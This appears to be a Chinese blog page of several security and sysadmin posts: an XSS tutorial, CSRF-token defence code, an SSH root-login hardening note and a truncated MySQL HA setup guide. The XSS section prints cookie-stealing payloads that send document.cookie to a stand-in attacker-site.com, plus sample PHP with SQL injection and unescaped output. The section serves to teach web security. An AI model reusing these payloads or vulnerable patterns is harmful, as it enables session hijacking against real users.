<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?name=%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2d%73%69%74%65%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e</div></pre></td></tr></table></figure>
<h2 id="2-持久型xss攻击"><a href="#2-持久型xss攻击" class="headerlink" title="2.持久型xss攻击"></a>2.持久型xss攻击</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。下面来看一个利用持久型xss攻击获取session id的实例。</p>
<h2 id="session背景知识"><a href="#session背景知识" class="headerlink" title="session背景知识"></a>session背景知识</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们知道HTTP是一个无状态维持的协议，所有请求/应答都是独立的，其间不保存状态信息。但有些场景下我们需要维护状态信息，例如用户登录完web应用后，再一定时间内，用户再进行登录，应不需要再输入用户名/密码进行鉴权。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时我们用cookie和session解决状态维护问题，当用户首次登入时，服务器为该用户创建一个 session ID，同时向游览器传送一个 cookie，cookie保存会话连接中用到的数据，session ID作为会话标识，游览器后续的请求均基于该session ID。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;攻击者可以提供一个攻击链接，当用户点击该链接时，向攻击者自己的服务器发送一条保存有用户session ID的信息，这样就可以窃取到用户的session ID，得到用户的执行权限。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现有以下login.php，其根据 user_name 在数据中查找相应的 pass_word，然后将用户提供的 password 与查数据库所得的 pass_word 进行比较，如果验证成功则创建对应于 user_name 的 session。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"><span class="variable">$Host</span>= <span class="string">'192.168.1.8'</span>;</div><div class="line"><span class="variable">$Dbname</span>= <span class="string">'app'</span>;</div><div class="line"><span class="variable">$User</span>= <span class="string">'yyy'</span>;</div><div class="line"><span class="variable">$Password</span>= <span class="string">'xxx'</span>;</div><div class="line"><span class="variable">$Schema</span> = <span class="string">'test'</span>;</div><div class="line"></div><div class="line"><span class="variable">$Conection_string</span>=<span class="string">"host=<span class="variable">$Host</span> dbname=<span class="variable">$Dbname</span> user=<span class="variable">$User</span> password=<span class="variable">$Password</span>"</span>;</div><div class="line"></div><div class="line">/* Connect with database asking <span class="keyword">for</span> a new connection*/</div><div class="line"><span class="variable">$Connect</span>=pg_connect(<span class="variable">$Conection_string</span>,<span class="variable">$PGSQL_CONNECT_FORCE_NEW</span>);</div><div class="line"></div><div class="line">/* Error checking the connection string */</div><div class="line"><span class="keyword">if</span> (!<span class="variable">$Connect</span>) &#123;</div><div class="line"> <span class="built_in">echo</span> <span class="string">"Database Connection Failure"</span>;</div><div class="line"> <span class="built_in">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="variable">$query</span>=<span class="string">"SELECT user_name,password from <span class="variable">$Schema</span>.members where user_name='"</span>.<span class="variable">$_POST</span>[<span class="string">'user_name'</span>].<span class="string">"';"</span>;</div><div class="line"></div><div class="line"><span class="variable">$result</span>=pg_query(<span class="variable">$Connect</span>,<span class="variable">$query</span>);</div><div class="line"><span class="variable">$row</span>=pg_fetch_array(<span class="variable">$result</span>,NULL,PGSQL_ASSOC);</div><div class="line"></div><div class="line"><span class="variable">$user_pass</span> = md5(<span class="variable">$_POST</span>[<span class="string">'pass_word'</span>]);</div><div class="line"><span class="variable">$user_name</span> = <span class="variable">$row</span>[<span class="string">'user_name'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(strcmp(<span class="variable">$user_pass</span>,<span class="variable">$row</span>[<span class="string">'password'</span>])!=0) &#123;</div><div class="line"> <span class="built_in">echo</span> <span class="string">"Login failed"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line"> <span class="comment"># Start the session</span></div><div class="line"> session_start();</div><div class="line"> <span class="variable">$_SESSION</span>[<span class="string">'USER_NAME'</span>] = <span class="variable">$user_name</span>;</div><div class="line"> <span class="built_in">echo</span> <span class="string">"&lt;head&gt; &lt;meta http-equiv=\"Refresh\" content=\"0;url=home.php\" &gt; &lt;/head&gt;"</span>;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另有以下home.php，其根据登入的用户是 admin 还是其他用户，显示不同内容，对于admin，其列出所有用户，对于其他用户，提供包含输入框的form，可在数据库中插入新的用户名信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">session_start();</div><div class="line"><span class="keyword">if</span>(!<span class="variable">$_SESSION</span>[<span class="string">'USER_NAME'</span>]) &#123;</div><div class="line"> <span class="built_in">echo</span> <span class="string">"Need to login"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line"> <span class="variable">$Host</span>= <span class="string">'192.168.1.8'</span>;</div><div class="line"> <span class="variable">$Dbname</span>= <span class="string">'app'</span>;</div><div class="line"> <span class="variable">$User</span>= <span class="string">'yyy'</span>;</div><div class="line"> <span class="variable">$Password</span>= <span class="string">'xxx'</span>;</div><div class="line"> <span class="variable">$Schema</span> = <span class="string">'test'</span>;</div><div class="line"> <span class="variable">$Conection_string</span>=<span class="string">"host=<span class="variable">$Host</span> dbname=<span class="variable">$Dbname</span> user=<span class="variable">$User</span> password=<span class="variable">$Password</span>"</span>;</div><div class="line"> <span class="variable">$Connect</span>=pg_connect(<span class="variable">$Conection_string</span>,<span class="variable">$PGSQL_CONNECT_FORCE_NEW</span>);</div><div class="line"> <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</div><div class="line">  <span class="variable">$query</span>=<span class="string">"update <span class="variable">$Schema</span>.members set display_name='"</span>.<span class="variable">$_POST</span>[<span class="string">'disp_name'</span>].<span class="string">"' where user_name='"</span>.<span class="variable">$_SESSION</span>[<span class="string">'USER_NAME'</span>].<span class="string">"';"</span>;</div><div class="line">  pg_query(<span class="variable">$Connect</span>,<span class="variable">$query</span>);</div><div class="line">  <span class="built_in">echo</span> <span class="string">"Update Success"</span>;</div><div class="line"> &#125;</div><div class="line"> <span class="keyword">else</span> &#123;</div><div class="line">  <span class="keyword">if</span>(strcmp(<span class="variable">$_SESSION</span>[<span class="string">'USER_NAME'</span>],<span class="string">'admin'</span>)==0) &#123;</div><div class="line">   <span class="built_in">echo</span> <span class="string">"Welcome admin&lt;br&gt;&lt;hr&gt;"</span>;</div><div class="line">   <span class="built_in">echo</span> <span class="string">"List of user's are&lt;br&gt;"</span>;</div><div class="line">   <span class="variable">$query</span> = <span class="string">"select display_name from <span class="variable">$Schema</span>.members where user_name!='admin'"</span>;</div><div class="line">   <span class="variable">$res</span> = pg_query(<span class="variable">$Connect</span>,<span class="variable">$query</span>);</div><div class="line">   <span class="keyword">while</span>(<span class="variable">$row</span>=pg_fetch_array(<span class="variable">$res</span>,NULL,PGSQL_ASSOC)) &#123;</div><div class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$row</span>[display_name]&lt;br&gt;"</span>;</div><div class="line">   &#125;</div><div class="line"> &#125;</div><div class="line"> <span class="keyword">else</span> &#123;</div><div class="line">  <span class="built_in">echo</span> <span class="string">"&lt;form name=\"tgs\" id=\"tgs\" method=\"post\" action=\"home.php\"&gt;"</span>;</div><div class="line">  <span class="built_in">echo</span> <span class="string">"Update display name:&lt;input type=\"text\" id=\"disp_name\" name=\"disp_name\" value=\"\"&gt;"</span>;</div><div class="line">  <span class="built_in">echo</span> <span class="string">"&lt;input type=\"submit\" value=\"Update\"&gt;"</span>;</div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意以上场景中，对 admin 和其他用户进行了不同的权限设置，admin可以看到所有用户列表，下面我们来看如何获取 admin 的session ID，从而使得其他用户也能获得 admin 的权限。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，攻击者以一个普通用户登录进来，然后在输入框中提交以下数据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=<span class="comment"># onclick=\"document.location=\'http://attacker-site.com/xss.php?c=\'+escape\(document.cookie\)\;\"&gt;bangerlee&lt;/a&gt;</span></div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;攻击者提交了条带<a>标签的数据，该条数据将保存在数据库中，而当 admin 用户登入时，包含 “bangerlee” 的用户列表将显示，如果 admin 用户点击 “bangerlee” 时，在 “attacker-site.com” 所在的服务器上，攻击者就可以窃取到 admin 的session-id：</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xss.php?c=PHPSESSID%3Dvmcsjsgear6gsogpu7o2imr9f3</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有了该session-id，攻击者在会话有效期内即可获得 admin 用户的权限，并且由于攻击数据已添加入数据库，只要攻击数据未被删除，那么攻击还有可能生效，是持久性的。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然，不是只有持久型xss攻击才能窃取session ID、用户的cookie信息，用非持久型xss也可以，只要引导用户点击某链接，将 document.cookie 信息传到指定服务器即可，以上仅作为说明持久型xss攻击的举例。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux安全/">Linux安全</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-Linux安全/1. CSRF攻击防范" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/09/03/Linux安全/1. CSRF攻击防范/" class="article-date">
  	<time datetime="2017-09-02T18:04:46.015Z" itemprop="datePublished">2017-09-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/03/Linux安全/1. CSRF攻击防范/">
        CSRF攻击防范
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF攻击必须依次完成以下两个条件： </p>
<ol>
<li>登录受信任网站A，并在本地生成Cookie。 </li>
<li>在不登出A的情况下，访问危险网站B。</li>
</ol>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录/结束会话了</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF攻击形成的原因： </p>
<ol>
<li>网站违反了HTTP协议，使用GET请求更新资源(非常危险). </li>
<li>使用无校验的表单</li>
</ol>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF攻击是源于WEB的隐式身份验证机制！(比如你在A网站登录后,在同一个浏览器的tab页打开B网站网页, 而B网站网页有一些脚本链接到A网站并偷偷的发送请求更新你账号的信息.如果没有防CSRF攻击,这样是可以实现的.) </p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF防范方式：客户端页面增加伪随机数。每次需要修改该用户的数据库信息时必须带上该随机数,否则不受理.</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法: 在Form表单加一个hidden field，里面是服务端生成的足够随机数的一个Token(恶意网站猜不到也无法获取到相同的Token), 然后使用一个拦截器interceptor来检查每一个非get请求, 看该token与服务器token是否一致,不一致的不受理该请求. </p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下是token 的工具管理类:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">package com.xxx.xxx.util;</div><div class="line"></div><div class="line">import javax.servlet.http.HttpServletRequest;</div><div class="line">import javax.servlet.http.HttpSession;</div><div class="line">import java.util.UUID;</div><div class="line"></div><div class="line"></div><div class="line">/**</div><div class="line"> * CSRFtoken管理类</div><div class="line"> *</div><div class="line"> * @author 作者  yss</div><div class="line"> * @version 版本号 v1.0</div><div class="line"> */</div><div class="line">public final class CSRFTokenManager &#123;</div><div class="line"></div><div class="line"></div><div class="line">    /**</div><div class="line">     * 约定规范：表单提交时的token的input的name属性必须为该值才能获取到后台返回的token。</div><div class="line">     * 下面是使用EL表达式接收从后台返回的token参数</div><div class="line">     * 如: &lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> id=<span class="string">"CSRFToken"</span> value=<span class="string">"<span class="variable">$&#123;CSRFToken&#125;</span>"</span>&gt;</div><div class="line">     */</div><div class="line">    public static final String CSRF_PARAM_NAME = <span class="string">"CSRFToken"</span>;</div><div class="line"></div><div class="line">    /**</div><div class="line">     * 存放在session中的token名称(跟上面的name属性值不一定一样)</div><div class="line">     */</div><div class="line">    public static final String CSRF_TOKEN_FOR_SESSION_ATTR_NAME = CSRFTokenManager.class.getName() + <span class="string">".tokenval"</span>;</div><div class="line"></div><div class="line">    /**</div><div class="line">     *从session中获取token字符串</div><div class="line">     * @param session</div><div class="line">     * @<span class="built_in">return</span></div><div class="line">     */</div><div class="line">    public static String getTokenForSession(HttpSession session) &#123;</div><div class="line">        String token = null;</div><div class="line">        //保证session只存在一个token，避免多线程情况下产生冲突。</div><div class="line">        synchronized (session) &#123;</div><div class="line">            token = (String) session.getAttribute(CSRF_TOKEN_FOR_SESSION_ATTR_NAME);//尝试获取session中的token</div><div class="line">            <span class="keyword">if</span> (null == token) &#123;//如果session中没有token，就重新生成一个token</div><div class="line">                token = UUID.randomUUID().toString();</div><div class="line">                session.setAttribute(CSRF_TOKEN_FOR_SESSION_ATTR_NAME, token);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">return</span> token;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    /**</div><div class="line">     *获取到request中的token值。</div><div class="line">     * @param request</div><div class="line">     * @<span class="built_in">return</span></div><div class="line">     */</div><div class="line"></div><div class="line">    public static String getTokenFromRequest(HttpServletRequest request) &#123;</div><div class="line">        <span class="built_in">return</span> request.getParameter(CSRF_PARAM_NAME);</div><div class="line">    &#125;</div><div class="line">//构造器</div><div class="line">    private <span class="function"><span class="title">CSRFTokenManager</span></span>() &#123;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;后台返回token参数给页面:</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;String token = CSRFTokenManager.getTokenForSession(request.getSession());//uuid生成的随机token</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;modelAndView.addObject(CSRFTokenManager.CSRF_PARAM_NAME, token);//添加token参数 <input type="hidden" id="CSRFToken" value="${CSRFToken}">&lt;%–token–%&gt;</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编写代码要符合HTTP规范,不要使用GET请求更新资源 </p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在非GET请求中带上token 参数(ajax请求也要),然后使用拦截器检查. </p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于受到CSRF攻击使用的是抛自定义异常,然后使用springmvc全局异常进行处理</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">package com.xxx.xxx.interceptor;</div><div class="line"></div><div class="line">import com.xxx.xxx.exception.CSRFException;</div><div class="line">import com.xxx.xxx.util.CSRFTokenManager;</div><div class="line">import org.springframework.web.servlet.ModelAndView;</div><div class="line">import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;</div><div class="line"></div><div class="line">import javax.servlet.http.HttpServletRequest;</div><div class="line">import javax.servlet.http.HttpServletResponse;</div><div class="line"></div><div class="line">/**</div><div class="line"> * 对于未登录用户的请求进行拦截,确保用户已经登录,然后进行后续的网页请求</div><div class="line"> *</div><div class="line"> * @Author yss</div><div class="line"> * @Version 1.0</div><div class="line"> * @see</div><div class="line"> */</div><div class="line">public class CSRFInterceptor extends HandlerInterceptorAdapter &#123;</div><div class="line"></div><div class="line">    @Override</div><div class="line">    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;</div><div class="line">//        Enumeration parasm = request.getParameterNames();</div><div class="line">        <span class="keyword">if</span> (!<span class="string">"GET"</span>.equals(request.getMethod())) &#123;//非get请求</div><div class="line">            String CSRFToken = CSRFTokenManager.getTokenFromRequest(request);//页面传过来的csrf参数</div><div class="line">            <span class="keyword">if</span> (CSRFToken == null || !CSRFToken.equals(CSRFTokenManager.getTokenForSession(request.getSession()))) &#123;//token不对应</div><div class="line">                throw new CSRFException(<span class="string">"CSRF攻击"</span>);//抛异常后将会进入springmvc全局异常处理体系</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">return</span> <span class="literal">true</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    @Override</div><div class="line">    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123;</div><div class="line">        super.postHandle(request, response, handler, modelAndView);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在spring的配置文件中添加拦截器使其生效</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;mvc:interceptors&gt;</div><div class="line">    &lt;!-- 防止CSRF攻击的拦截器 --&gt;</div><div class="line">    &lt;mvc:interceptor&gt;</div><div class="line">        &lt;mvc:mapping path=<span class="string">"/**"</span>/&gt;</div><div class="line">        &lt;bean id=<span class="string">"CSRFInterceptor"</span> class=<span class="string">"com.xxx.xxx.interceptor.CSRFInterceptor"</span>&gt;&lt;/bean&gt;</div><div class="line">    &lt;/mvc:interceptor&gt;</div><div class="line">&lt;/mvc:interceptors&gt;</div></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux安全/">Linux安全</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-Linux安全/10. root账户不允许远程登陆" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/09/03/Linux安全/10. root账户不允许远程登陆/" class="article-date">
  	<time datetime="2017-09-02T18:04:46.015Z" itemprop="datePublished">2017-09-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/03/Linux安全/10. root账户不允许远程登陆/">
        root账户不允许远程登陆
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时为了特殊需求，只允许普通账户登陆Linux，而不允许root账户登陆，而普通账户登陆后，然后再su 到root下是可以的。打开sshd的配置文件 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/ssh/sshd_config</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入一行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PermitRootLogin no</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启sshd服务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service sshd restart</div></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux安全/">Linux安全</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-HA集群/5. Mysql-5.5+Heartbeat-3.0.5+DRBD" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/09/03/HA集群/5. Mysql-5.5+Heartbeat-3.0.5+DRBD/" class="article-date">
  	<time datetime="2017-09-02T18:04:46.009Z" itemprop="datePublished">2017-09-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/03/HA集群/5. Mysql-5.5+Heartbeat-3.0.5+DRBD/">
        Mysql-5.5+Heartbeat-3.0.5+DRBD
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;环境：</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CentOS 6.5</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MySQL_Master  </p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;eth0  192.168.1.10</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;eth1  192.168.2.10        </p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MySQL_Slave    </p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;eth0  192.168.1.11</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;eth1  192.168.2.11</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HA    192.168.1.254</p>
<h2 id="创建RAID1-0组合-存储数据-四块硬盘"><a href="#创建RAID1-0组合-存储数据-四块硬盘" class="headerlink" title="创建RAID1+0组合[存储数据 四块硬盘]"></a>创建RAID1+0组合[存储数据 四块硬盘]</h2><h3 id="1-创建两块RAID1-4块硬盘、MySQL主从节点执行"><a href="#1-创建两块RAID1-4块硬盘、MySQL主从节点执行" class="headerlink" title="1.创建两块RAID1 [4块硬盘、MySQL主从节点执行]"></a>1.创建两块RAID1 [4块硬盘、MySQL主从节点执行]</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">[root@master ~]<span class="comment"># mdadm --create /dev/md0 --level=raid1 --raid-devices=2 /dev/sdb1 /dev/sdc1</span></div><div class="line">mdadm: Note: this array has metadata at the start and</div><div class="line"> may not be suitable as a boot device. If you plan to</div><div class="line"> store <span class="string">'/boot'</span> on this device please ensure that</div><div class="line"> your boot-loader understands md/v1.x metadata, or use</div><div class="line"> --metadata=0.90</div><div class="line">Continue creating array? y</div><div class="line">mdadm: Defaulting to version 1.2 metadata</div><div class="line">mdadm: array /dev/md0 started.</div><div class="line">[root@master ~]<span class="comment"># mdadm --create /dev/md1 --level=raid1 --raid-devices=2 /dev/sdb1 /dev/sdc1</span></div><div class="line">mdadm: Note: this array has metadata at the start and</div><div class="line"> may not be suitable as a boot device. If you plan to</div><div class="line"> store <span class="string">'/boot'</span> on this device please ensure that</div><div class="line"> your boot-loader understands md/v1.x metadata, or use</div><div class="line"> --metadata=0.90</div><div class="line">Continue creating array? y</div><div class="line">mdadm: Defaulting to version 1.2 metadata</div><div class="line">mdadm: array /dev/md1 started.</div></pre></td></tr></table></figure>
<h3 id="2-利用两个-RAID1-创建-RAID0"><a href="#2-利用两个-RAID1-创建-RAID0" class="headerlink" title="2.利用两个 RAID1 创建 RAID0"></a>2.利用两个 RAID1 创建 RAID0</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@CentOS ~]<span class="comment"># mdadm --create /dev/md2 --level=raid0 --raid-devices=2 /dev/md0 /dev/md1</span></div><div class="line">mdadm: Defaulting to version 1.2 metadata</div><div class="line">mdadm: array /dev/md2 started.</div></pre></td></tr></table></figure>
<h3 id="3-将raid信息写入配置文件"><a href="#3-将raid信息写入配置文件" class="headerlink" title="3.将raid信息写入配置文件"></a>3.将raid信息写入配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">[root@master ~]<span class="comment"># mdadm --detail --scan &gt; /etc/mdadm.conf </span></div><div class="line">[root@master ~]<span class="comment"># vi /etc/mdadm.conf</span></div><div class="line">ARRAY /dev/md0 metadata=1.2 name=CentOS:0 UUID=b4c4c7b4:0f9f6e60:7eb24578:29682c96</div><div class="line">devices /dev/sdb1 /dev/sdc1</div><div class="line">ARRAY /dev/md1 metadata=1.2 name=CentOS:1 UUID=f5afcda6:86847677:c752fcdd:fbb91e00</div><div class="line">devices /dev/sdd1 /dev/sde1</div><div class="line">ARRAY /dev/md2 metadata=1.2 name=CentOS:2 